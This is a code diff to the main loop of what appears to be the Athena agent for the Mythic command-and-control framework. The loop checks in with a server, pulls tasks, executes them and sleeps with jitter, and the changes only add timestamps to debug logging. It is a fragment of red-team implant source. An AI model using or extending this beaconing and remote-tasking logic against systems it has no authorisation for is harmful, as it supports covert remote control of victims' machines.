@@ -30,16 +30,12 @@ namespace Athena
 
             //MythicClient controls all of the agent communications
             AthenaClient ac = new AthenaClient();
-            Debug.WriteLine($@"""Initiated Athena Client with following values:
-Forwarder: {ac.forwarder.GetType()}
-Profile: {ac.currentConfig.GetType()}
-                """);
             //First Checkin-In attempt
             CheckinResponse res = await ac.handleCheckin();
             
             if (!await ac.updateAgentInfo(res))
             {
-                Debug.WriteLine("Failed to update agent info, exiting.");
+                Debug.WriteLine($"[{DateTime.Now}] Failed to update agent info, exiting.");
                 Environment.Exit(0);
             }
 
@@ -51,12 +47,12 @@ Profile: {ac.currentConfig.GetType()}
             {
                 try
                 {
-                    Debug.WriteLine("Loop begin.");
+                    Debug.WriteLine($"[{DateTime.Now}] Beginning task loop, requesting tasks.");
                     List<MythicTask> tasks = await ac.GetTasks();
-                    Debug.WriteLine($"Received {tasks.Count} tasks.");
+                    Debug.WriteLine($"[{DateTime.Now}] Received {tasks.Count} tasks.");
                     if (ac.exit)
                     {
-                        Debug.WriteLine("Exit requested.");
+                        Debug.WriteLine($"[{DateTime.Now}] Exit requested.");
                         Environment.Exit(0);
                     }
 
@@ -65,7 +61,7 @@ Profile: {ac.currentConfig.GetType()}
                         missedCheckins++;
                         if (missedCheckins == maxMissedCheckins)
                         {
-                            Debug.WriteLine("Hit max checkins, exiting.");
+                            Debug.WriteLine($"[{DateTime.Now}] Hit max checkins, exiting.");
                             Environment.Exit(0);
                         }
                     }
@@ -73,6 +69,7 @@ Profile: {ac.currentConfig.GetType()}
                     {
                         Parallel.ForEach(tasks, async c =>
                         {
+                            Debug.WriteLine($"[{DateTime.Now}] Executing task with ID: {c.id}");
                             Task.Run(() => ac.commandHandler.StartJob(c));
                         });
                     }
@@ -83,12 +80,12 @@ Profile: {ac.currentConfig.GetType()}
                     missedCheckins++;
                     if (missedCheckins == maxMissedCheckins)
                     {
-                        Debug.WriteLine("Hit max checkins, exiting.");
+                        Debug.WriteLine($"[{DateTime.Now}] Hit max checkins, exiting.");
                         Environment.Exit(0);
                     }
-                    Debug.WriteLine("Max checkins not hit, continuing loop.");
+                    Debug.WriteLine($"[{DateTime.Now}] Max checkins not hit, continuing loop.");
                 }
-                Debug.WriteLine("Starting sleep");
+                Debug.WriteLine($"[{DateTime.Now}] Sleeping.");
                 await Task.Delay(await Misc.GetSleep(ac.currentConfig.sleep, ac.currentConfig.jitter) * 1000);
             }
         }
